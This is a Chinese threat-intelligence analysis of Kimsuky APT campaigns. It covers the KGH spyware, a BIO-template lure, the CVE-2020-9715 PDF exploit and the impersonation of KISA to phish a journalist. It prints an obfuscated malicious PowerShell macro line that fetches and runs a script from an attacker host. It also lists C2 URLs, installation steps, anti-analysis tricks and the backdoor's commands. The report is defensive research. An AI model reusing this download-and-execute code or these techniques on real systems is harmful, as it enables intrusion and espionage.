## ****一、概述****

Kimsuky APT组织据悉是具有国家背景的先进网络间谍组织，一直针对韩国、俄罗斯等政府机构开展网络威胁间谍活动，窃取高价值情报是该组织的主要目的。

微步情报局近期通过威胁狩猎系统监测到Kimsuky APT组织使用KGH间谍组件、PDF漏洞以及针对韩国新闻工作者等攻击活动，分析有如下发现：

> 攻击者将KGH间谍组件伪装成浏览器扩展组件，诱导用户执行；
>
> 在KGH间谍组件中使用多种手段如反沙箱、反虚拟机、反调试等对抗分析；
>
> 相关KGH组件在目标主机上以服务方式隐蔽运行，可响应C2服务器10余种远程指令；
>
> 此次攻击活动中的相关样本基本延续了以往攻击活动中KGH间谍组件的功能，有一定程度的拓展；
>
> 攻击者使用CVE-2020-0986提权漏洞搭配KGH间谍组件使用；
>
> 所使用攻击组件针对性强，定向攻击特征明显；
>
> 攻击者疑似向目标发送简历模板文档进行攻击活动；
>
> Kimsuky使用PDF漏洞CVE-2020-9715对韩国政府相关机构进行定向攻击；
>
> 此外还冒充KISA员工，对韩国媒体“朝鲜日报”新闻工作者李光白进行定向攻击；
>
> 微步在线通过对相关样本、IP 和域名的溯源分析，提取多条相关 IOC ，可用于威胁情报检测。微步在线威胁感知平台 TDP 、本地威胁情报管理平台 TIP
> 、威胁情报云 API 、互联网安全接入服务 OneDNS 、主机威胁检测与响应平台 OneEDR 等均已支持对此次攻击事件和团伙的检测。

##  ** **二、详情****

###  ** **2.1**** ** **利用KGH间谍组件攻击****

攻击者将KGH间谍木马伪装成“安全组件扩展安装程序”，运行之后将会弹出消息框提示“扩展已添加到Whale浏览器”，Whale浏览器是韩国Naver公司开发的免费网页浏览器，在韩国有一定的市场占有率。实际运行完之后将会安装KGH间谍组件，最终主机被攻击者远程控制。

![1634630840_616e7cb82bee8889a11bd.png!small?1634630841475](https://image.3001.net/images/20211019/1634630840_616e7cb82bee8889a11bd.png!small?1634630841475)

图[1] 伪装为安装程序的KGH间谍组件

###  ** **2.2**** ** **以个人经历模板为诱饵进行攻击****

攻击者疑似以招聘名义向目标发送个人经历文档，文档仅为固定模板格式，本身并不包含实际有效内容，利用模板注入技术，使用多阶段载荷进行攻击。

![1634630850_616e7cc26e32d6b4b4cc4.png!small?1634630851813](https://image.3001.net/images/20211019/1634630850_616e7cc26e32d6b4b4cc4.png!small?1634630851813)

图[2] 以“BIO”为主题的诱饵文档

###  ** **2.3**** ** **利用PDF漏洞攻击****

Kimsuky以朝韩政府相关话题为诱饵，使用携带PDF漏洞的文档对特定单位进行攻击，当用户通过未更新的Adobe
Acrobat程序打开PDF文档触发漏洞后，间谍模块将会得到安装。

![1634630864_616e7cd026261276d2021.png!small?1634630865758](https://image.3001.net/images/20211019/1634630864_616e7cd026261276d2021.png!small?1634630865758)

|

![1634630870_616e7cd6d9c9921a83744.png!small?1634630872334](https://image.3001.net/images/20211019/1634630870_616e7cd6d9c9921a83744.png!small?1634630872334)  
  
---|---  
  
제4기AMP 안내자료.pdf

（第四期和平经济首席执行官课程”）

|

ooo.pdf

（南北首脑协议国会批准同意和实现韩半岛和平体制）  
  
图[3] 携带漏洞的PDF文档

###  ** **2.4**** ** **冒充韩国KISA对新闻工作者进行攻击****

Kimsuky冒充KISA（韩国互联网安全局）员工向韩国媒体“朝鲜日报”新闻工作者李光白定向投递钓鱼邮件，同样使用多阶段载荷进行攻击。

![1634630884_616e7ce4e1da191894841.png!small?1634630886331](https://image.3001.net/images/20211019/1634630884_616e7ce4e1da191894841.png!small?1634630886331)

图[4] Kimsuky冒充KISA员工向目标发送钓鱼邮件

##  ** **三、样本分析****

###  ** **3**** ** **.1**** ** **K**** ** **GH**** ** **间谍组件****

 ** **第一阶段：安装****

样本执行后首先检查注册表项 HKEY_LOCAL_MACHINE\SOFTWARE\\\Microsoft\\\\.NET NData
是否存在，如果存在代表已经安装成功，将会退出流程，此注册表项作为感染标记，安装成功后将会设置为服务项名称。

样本使用了多种手段进行环境侦察，例如加载特定dll（3rgs.dll）、检查CPU核心数量是否大于1个、使用ZwSetInformationThread、检查Process标志位、使用NtQueryInformationProcess、检查硬件断点等进行反沙箱、反虚拟机化、反调试操作，检查完毕后，从资源中加载PE模块，与0x1B按字节异或后释放到%Temp%\dwr.db。

![1634630904_616e7cf87d181f602d6a0.png!small?1634630905887](https://image.3001.net/images/20211019/1634630904_616e7cf87d181f602d6a0.png!small?1634630905887)

图[5] 从资源中加载PE模块

接着枚举主机注册表HKLM\Software\\\Microsoft\\\Windows
NT\\\CurrentVersion\\\Svchost下的netsvcs组信息，逐个检查是否存在对应服务，将不存在的收集起来放入数组中，随机从数组中取出一个作为后续要创建的服务名称。

![1634630923_616e7d0b81e82ad35cec9.png!small?1634630925031](https://image.3001.net/images/20211019/1634630923_616e7d0b81e82ad35cec9.png!small?1634630925031)

图[6] 枚举netsvcs组信息

取得服务名称后，拼接以下字符串，保存到%Temp%\wed.bat并执行，利用bat文件完成安装流程。

![1634630928_616e7d10a00128ddff556.png!small?1634630930059](https://image.3001.net/images/20211019/1634630928_616e7d10a00128ddff556.png!small?1634630930059)

图[7] 利用bat文件完成安装

wed.bat文件的执行流程如下：

> 将%Temp%\dwr.db移动到C:\Windows\System32\winfix.dll；
>
> 在服务注册表里添加上面服务名称与服务参数键值“ServiceDll”，路径为C:\Windows\System32\winfix.dll；
>
> 在服务注册表里添加服务描述信息“Windows Management Instrumentation Framework”；
>
> 创建指定名称的服务项；
>
> 创建注册表项 HKLM\SOFTWARE\Microsoft\\.NET NData,sign，值为上面的服务名称，作为感染标记；
>
> 启动服务；
>
> 删除bat文件；

最后将会以MessageBox弹出韩文对话框提示，意为“扩展已添加到Whale浏览器”，再借用bat文件进行自删除。

![1634630959_616e7d2fda10a887edda5.png!small?1634630961254](https://image.3001.net/images/20211019/1634630959_616e7d2fda10a887edda5.png!small?1634630961254)

图[8] 弹出提示框并自删除

 ** **第二阶段：服务执行****

经过上述安装流程后，模块winfix.dll以服务方式运行，执行后首先在DllMain函数中检查宿主进程是否是svchost，如果不是将会退出流程。

![1634630968_616e7d38a9d0b1827c424.png!small?1634630970023](https://image.3001.net/images/20211019/1634630968_616e7d38a9d0b1827c424.png!small?1634630970023)

图[9] 检查父进程是否是svchost

接着ServiceMain函数启动后，同样会检查感染标记，如果无感染标记将不会进入主流程。

![1634630973_616e7d3dab7570e33ead9.png!small?1634630975036](https://image.3001.net/images/20211019/1634630973_616e7d3dab7570e33ead9.png!small?1634630975036)

图[10] 设置注册表感染标记

创建名为"B4ujfw9iekfak32w4"的文件共享内存，将C2配置http://support-hosting.000webhostapp.com/home/放入共享内存。

![1634630978_616e7d42ea73eebf65f0e.png!small?1634630980533](https://image.3001.net/images/20211019/1634630978_616e7d42ea73eebf65f0e.png!small?1634630980533)

图[11] 将C2配置放入共享内存

之后从资源中加载下阶段PE模块，并于0x1B按字节异或，在内存中展开执行，每隔40~80分钟调用其名为“out”的导出函数。

![1634631045_616e7d855edad8b2d54f5.png!small?1634631046790](https://image.3001.net/images/20211019/1634631045_616e7d855edad8b2d54f5.png!small?1634631046790)

图[12] 内存加载核心模块并调用其导出函数

此外，还会开启线程进行反调试操作，每隔3~6秒检查是否有硬件断点，如果检查到将会终止进程。

![1634631051_616e7d8bb5009b629f6d5.png!small?1634631053161](https://image.3001.net/images/20211019/1634631051_616e7d8bb5009b629f6d5.png!small?1634631053161)

图[13] 反调试线程

 ** **第三阶段：远程控制****

上个阶段加载的模块从文件PE结构中可以看到该模块被命名为“KGH_Backdoor.dll”。

![1634631204_616e7e2450edeb13d107b.png!small?1634631205711](https://image.3001.net/images/20211019/1634631204_616e7e2450edeb13d107b.png!small?1634631205711)

图[14] PE结构中的Dll名称

其得到执行后在DllMain函数中首先收集主机信息，包括UserName、ComputerName、系统平台，样本随后将使用ComputerName作为主机ID。

![1634631362_616e7ec2982de3f860c2a.png!small?1634631364393](https://image.3001.net/images/20211019/1634631362_616e7ec2982de3f860c2a.png!small?1634631364393)

图[15] 收集主机信息

之后从共享内存中获取C2配置以初始化配置，在导出函数out中，以HTTP GET方法向服务器请求下载文件保存到%Temp%\n.x。

{C2配置} ?act=news&id={ComputerName}

![1634631371_616e7ecb3687b3a0cd205.png!small?1634631372831](https://image.3001.net/images/20211019/1634631371_616e7ecb3687b3a0cd205.png!small?1634631372831)

图[16] 向服务器请求下载数据

成功下载文件后，以RC4算法解密文件数据，响应远程指令。

![1634631376_616e7ed0e8aa1456d204e.png!small?1634631378378](https://image.3001.net/images/20211019/1634631376_616e7ed0e8aa1456d204e.png!small?1634631378378)

图[17] 在KGH间谍组件中响应远程指令

远程指令格式如下：

shl

|

upf

|

上传文件  
  
---|---|---  
  
tre

|

使用tree命令查看目录结构  
  
inf

|

查看系统systeminfo和ipconfig信息  
  
wbi

|

下载模块数据，在内存中加载，执行导出函数“outinfo”  
  
cmd

|

执行cmd指令  
  
pws

|

执行powershell指令  
  
ups

|

下载可执行模块并利用bat文件运行  
  
uns

|

卸载自身  
  
dll

|

下载dll模块保存到指定目录，之后在内存中加载执行，调用其导出函数“outinfo”  
  
exe

|

下载exe模块保存到执行目录并直接运行。  
  
###  ** **3.2 Windows提权漏洞**** ** **CVE-2020-0986****

在另一个版本的KGH间谍组件中，攻击者利用漏洞CVE-2020-0986进行权限提升，该漏洞是Windows打印机组件的提权漏洞，以高权限运行核心模块。

![1634631449_616e7f19ec199efca0ce4.png!small?1634631451382](https://image.3001.net/images/20211019/1634631449_616e7f19ec199efca0ce4.png!small?1634631451382)

图[18] 漏洞利用相关反汇编代码片段

而核心模块拥有与KGH模块相同的导出表结构。

![1634631455_616e7f1fc81a3c250ad7e.png!small?1634631457228](https://image.3001.net/images/20211019/1634631455_616e7f1fc81a3c250ad7e.png!small?1634631457228)

图[19] 与KGH组件相同的导出表结构

相同的URL格式。

![1634631460_616e7f24cf6cbd182417e.png!small?1634631462332](https://image.3001.net/images/20211019/1634631460_616e7f24cf6cbd182417e.png!small?1634631462332)

图[20] 与KGH组件相同的URL格式

以及相同的指令格式，基本可以确认与KGH间谍套件同属一个平台，而此样本使用的C2为：web.spec.o-r.kr。

![1634631467_616e7f2be03467e17e806.png!small?1634631469328](https://image.3001.net/images/20211019/1634631467_616e7f2be03467e17e806.png!small?1634631469328)

图[21] 与KGH组件相同的指令格式

结合以往的攻击活动样本，目前已经发现KGH间谍组件的两种指令格式，如下图为KGH另外一套指令格式，可以看到两套指令格式截然不同，但整体执行框架具有高度相似性，且多个模块出现穿插复用情况，疑似为不同小组之间成员协同开发。

![1634631475_616e7f338a8eff805c3e2.png!small?1634631476902](https://image.3001.net/images/20211019/1634631475_616e7f338a8eff805c3e2.png!small?1634631476902)

|

![1634631482_616e7f3aea7188a21480b.png!small?1634631484365](https://image.3001.net/images/20211019/1634631482_616e7f3aea7188a21480b.png!small?1634631484365)  
  
---|---  
  
KGH另一套指令格式

|

此次攻击活动组件中的指令格式  
  
图[22] KGH间谍组件两套指令格式对比

###  ** **3.3 以“BIO模板”为主题的攻击****

近期发现Kimsuky向目标发送疑似 “BIO”（意味个人简历）模板文档进行攻击活动，文档中利用模板注入的手法从服务器加载远程模板。

URL：http://zhtjfde.mypressonline.com/officeDocument/2006/relationships/BIOStyle.dotm

![1634631496_616e7f4824ed99916544f.png!small?1634631497558](https://image.3001.net/images/20211019/1634631496_616e7f4824ed99916544f.png!small?1634631497558)

图[23] 使用模板注入手法加载远程模板

而所加载的模板携带了恶意宏，利用powershell从远程服务器下载执行脚本，体现了Kimsuky多阶段载荷的特点。

"$fjeils={(New-Object
Net.WebClient).Dring('http://outwd.myartsonline.com/yu/ls.txt')};[string]$aiwdf=$fjeils;$ndask=$aiwdf.insert(28,'ownloadst');$bmcns=iex
$ndask;iex $bmcns"  
  
---  
  
![1634631502_616e7f4e4511c5371c1f0.png!small?1634631503689](https://image.3001.net/images/20211019/1634631502_616e7f4e4511c5371c1f0.png!small?1634631503689)

图[24] 文档中携带的恶意宏

###  ** **3.4 PDF漏洞**** ** **CVE-2020-9715****

使用PDF漏洞在Kimsuky以往的攻击活动中并不常见，但近期发现该组织使用PDF文档相关漏洞CVE-2020-9715进行攻击活动。该组织以朝韩政府相关话题为诱饵向目标发送恶意PDF文档，用户通过未更新的Adobe
Acrobat程序打开PDF文档后，将会执行恶意JavaScript代码，并在内存中运行恶意模块。

![1634631516_616e7f5cb2f96157a9bcd.png!small?1634631518050](https://image.3001.net/images/20211019/1634631516_616e7f5cb2f96157a9bcd.png!small?1634631518050)

图[25] 疑似攻击者向目标发送的包含恶意pdf文档附件的钓鱼邮件

（图片来源： _https://twitter.com/cyberwar_15/status/1423583200853446657_ _）_

PDF文档内容以相关政府话题为诱饵，携带有JavaScript流数据。

![1634631539_616e7f738ec3d993618e1.png!small?1634631541073](https://image.3001.net/images/20211019/1634631539_616e7f738ec3d993618e1.png!small?1634631541073)

图[26] PDF文档中的JavaScript流数据

PDF文档得到执行后，创建存储在对象缓存中的数据ESObject，再删除对数据ESObject对象的引用，但其地址仍在对象缓存中。

![1634631546_616e7f7ae4ab2474d4236.png!small?1634631548270](https://image.3001.net/images/20211019/1634631546_616e7f7ae4ab2474d4236.png!small?1634631548270)

图[27] 漏洞利用代码片段1

之后访问对象缓存中已经释放的数据ESObject对象，最终触发UAF漏洞执行Shellcode，与网络上公开的CVE-2020-9715漏洞概念验证代码高度相似。

![1634631551_616e7f7fea17a317a9ca6.png!small?1634631553367](https://image.3001.net/images/20211019/1634631551_616e7f7fea17a317a9ca6.png!small?1634631553367)

图[28] 漏洞利用代码片段2

ShellCode得到执行后，将会获取AdobeARM.exe路径，创建一份挂起的进程。

![1634631558_616e7f862fa78af51c0dd.png!small?1634631559601](https://image.3001.net/images/20211019/1634631558_616e7f862fa78af51c0dd.png!small?1634631559601)

图[29] 漏洞触发后创建挂起的进程AdobeARM.exe

将核心PE模块注入执行。

![1634631563_616e7f8be55688e9e39f8.png!small?1634631565351](https://image.3001.net/images/20211019/1634631563_616e7f8be55688e9e39f8.png!small?1634631565351)

图[30] 注入执行

PE模块执行后首先通过注册表检查SystemProductName是否包含Virtual来进行反虚拟机操作。

![1634631575_616e7f971a2d8a64b93ef.png!small?1634631576503](https://image.3001.net/images/20211019/1634631575_616e7f971a2d8a64b93ef.png!small?1634631576503)

图[31] 反虚拟机操作

查找进程名称中含有V3的进程，并向其发送WM_CLOSE关闭窗口消息。

![1634631580_616e7f9c816bf4171f763.png!small?1634631581935](https://image.3001.net/images/20211019/1634631580_616e7f9c816bf4171f763.png!small?1634631581935)

图[32] 关闭特定窗口

之后每隔50~60分钟从服务器下载文件保存到%Appdata%\adobe\AdobeAdv.dll，直到下载成功，下载URL：tksRpdl.atwebpages.com\ccom2\download.php?filename=ccom2。

![1634631587_616e7fa362485e01d7a76.png!small?1634631588697](https://image.3001.net/images/20211019/1634631587_616e7fa362485e01d7a76.png!small?1634631588697)

图[33] 从服务器下载文件数据

下载时进行简单检验，第一个字节=0xB3，第二个字节=0xA4。

![1634631593_616e7fa9cba10db816494.png!small?1634631595352](https://image.3001.net/images/20211019/1634631593_616e7fa9cba10db816494.png!small?1634631595352)

图[34] 校验下载数据

下载完成后与0xFE按字节异或解密，再以LoadLibrary加载执行，截止分析时服务器已无法正常下载。

![1634631599_616e7fafdd9a3bba3c53f.png!small?1634631601486](https://image.3001.net/images/20211019/1634631599_616e7fafdd9a3bba3c53f.png!small?1634631601486)

图[35] 异或解密并加载执行模块

此外我们看到有疑似攻击者测试用的PDF样本，功能为仅运行calc.exe。

![1634631606_616e7fb651e385bf01559.png!small?1634631607742](https://image.3001.net/images/20211019/1634631606_616e7fb651e385bf01559.png!small?1634631607742)

图[36] 测试样本中仅执行calc.exe

其在5月7日就已被上传到VirusTotal，且上传地为韩国，使用韩国代理节点在Kimsuky以往的攻击活动中经常出现，推测攻击者在5月份就已经测试好相关攻击工具。

![1634631614_616e7fbe80fad289c32e4.png!small?1634631615845](https://image.3001.net/images/20211019/1634631614_616e7fbe80fad289c32e4.png!small?1634631615845)

图[37] VirusTotal中的样本上传信息

###  ** **3.5 冒充韩国KISA对新闻工作者进行鱼叉邮件攻击****

KISA为“韩国互联网安全局”，在之前Kimsuky曾伪装KISA制作移动端木马APP，对特定部门进行定向攻击。近期发现该组织同样冒充KISA员工，对韩国媒体
“朝鲜日报”新闻工作者李光白进行定向攻击。

攻击者以“210813_业务联系（网络安全）”为主题向目标投递钓鱼邮件，其冒充的KISA员工身份容易让目标降低警惕，而邮件中仅包含一个word文档附件，并没有其他正文内容。

![1634631628_616e7fccaeca709318922.png!small?1634631630062](https://image.3001.net/images/20211019/1634631628_616e7fccaeca709318922.png!small?1634631630062)

图[38] 攻击者向新闻工作者李光白发送的钓鱼邮件

当目标尝试打开附件文档时，将会提示输入密码，但攻击者并没有在邮件中注明密码，故需要目标主动联系黑客索要密码，这在一定程度上可以辅助攻击者了解目标是否收到邮件、是否有意向查看文档等信息，同时也可以规避安全软件的检查，以及阻止样本被安全人员分析。

![1634631634_616e7fd2e7a01eb836c93.png!small?1634631636309](https://image.3001.net/images/20211019/1634631634_616e7fd2e7a01eb836c93.png!small?1634631636309)

图[39] 附件为带有密码保护的文档

当目标向攻击者索要密码，攻击者就会立即回复，并重新发送带有密码的邮件。攻击者在邮件中假意致歉，称密码为“cyber08^”，邮件和文档中的署名均为“韩国互联网安全局综合分析组高级研究员金东旭”，国外媒体批露，该人已被证实确实为KISA员工，表明Kimsuky组织已经通过信息收集工作掌握特定人员信息。

![1634631642_616e7fda657f3d9cccfe2.png!small?1634631643887](https://image.3001.net/images/20211019/1634631642_616e7fda657f3d9cccfe2.png!small?1634631643887)

图[40] 攻击者的回复邮件内容

（图片来源：https://www.dailynk.com/20210817-4）

附件文档携带恶意宏，诱导用户启用宏，启用宏前后对比如下。

![1634631652_616e7fe433af114009afd.png!small](https://image.3001.net/images/20211019/1634631652_616e7fe433af114009afd.png!small)

|

![1634631668_616e7ff477a5d96422080.png!small?1634631669830](https://image.3001.net/images/20211019/1634631668_616e7ff477a5d96422080.png!small?1634631669830)  
  
---|---  
  
启用宏前

|

启用宏后  
  
图[41] 文档启用宏前后对比

在携带的恶意宏中将脚本代码释放到Templates目录下1589989024.xml，利用wscript从服务器下载执行下阶段脚本代码，分析该样本时已无法正常下载，但在以往Kimsuky的攻击活动中，经常看到此类攻击手法，该组织擅长使用多阶段载荷进行攻击。

下载URL：http://bipaf.org/bbs/zipcode/auth/a4b5e82/586f0a/list.php?query=1

![1634631683_616e8003e93d3eafd2ea3.png!small?1634631685358](https://image.3001.net/images/20211019/1634631683_616e8003e93d3eafd2ea3.png!small?1634631685358)

图[42] 从服务器下载执行下阶段脚本载荷

  

#  ** **四、关联分析****

KGH间谍套件非常具有代表性，在分析过程中，从样本中可以看到多处KGH字样，比如样本中出现的pdb路径：G:\KGH\SPY\VC_SPY\OneTroy\ServiceInstall\Release\ServiceInstall.pdb。

![1634631694_616e800ee41320f4369c8.png!small?1634631696315](https://image.3001.net/images/20211019/1634631694_616e800ee41320f4369c8.png!small?1634631696315)

图[43] 样本中的pdb路径信息

以及核心模块的命名KGH_Backdoor.dll，明确标注了模块的功能属性，KGH间谍组件的命名即是在以往攻击活动中发现的这些富有特点的名称。

![1634631700_616e8014d7a8794edb6c4.png!small?1634631702326](https://image.3001.net/images/20211019/1634631700_616e8014d7a8794edb6c4.png!small?1634631702326)

图[44] 样本中的Dll名称

与以往攻击活动中样本（66fc8b03bc0ab95928673e0ae7f06f34f17537caf159e178a452c2c56ba6dda7）进行对比，也发现存在高度一致性，开发者在原有组件的基础上进行了拓展，例如远程指令的拓展：

![1634631706_616e801ab83fd46e0584c.png!small?1634631708120](https://image.3001.net/images/20211019/1634631706_616e801ab83fd46e0584c.png!small?1634631708120)

|

![1634631709_616e801dc95aa73c0774d.png!small?1634631711190](https://image.3001.net/images/20211019/1634631709_616e801dc95aa73c0774d.png!small?1634631711190)  
  
---|---  
  
以往攻击活动样本

|

本次攻击活动样本  
  
图[45] KGH组件远程指令的拓展

多阶段载荷也是Kimsuky的攻击手法特点之一，其最终的模块执行通常要通过多阶段的脚本下载执行，而其URL格式也具备一定的特点，例如在冒充韩国KISA的攻击活动中看到的URL与之前攻击活动中的对比：

http://miracle.designsoup.co.kr/user/views/resort/controller/css/update/ **
**list.php?query=1****

|

http://bipaf.org/bbs/zipcode/auth/a4b5e82/586f0a/ ** **list.php?query=1****  
  
---|---  
  
以往攻击活动

|

冒充KISA对新闻工作者的攻击活动  
  
利用Powershell执行下阶段脚本载荷也是Kimsuky惯用的攻击手法，在上面以BIO为主题的钓鱼攻击中就出现此种攻击手法，与之前的攻击手法也同样类似。

http://quarez.atwebpages.com ** **/ds/le.txt****

|

http://outwd.myartsonline.com ** **/yu/ls.txt****  
  
---|---  
  
以往攻击活动

|

以BIO为主题的钓鱼攻击  
  
##  ** **五、结论****

Kimsuky
APT组织近期一直保持活跃状态，积极进行相关情报搜集工作，其攻击活动呈现多阶段载荷、基础设施高复杂度等特点。我们观察到Kimsuky一直在持续开发新的工具以及旧工具的变种，且近期使用多种漏洞针对特定机构进行定向攻击，使用社会工程学方案是Kimsuky惯用的攻击手法之一，在整个攻击过程中攻击者使用了多种手段进行反虚拟机、反沙箱、反调试等进行分析对抗。

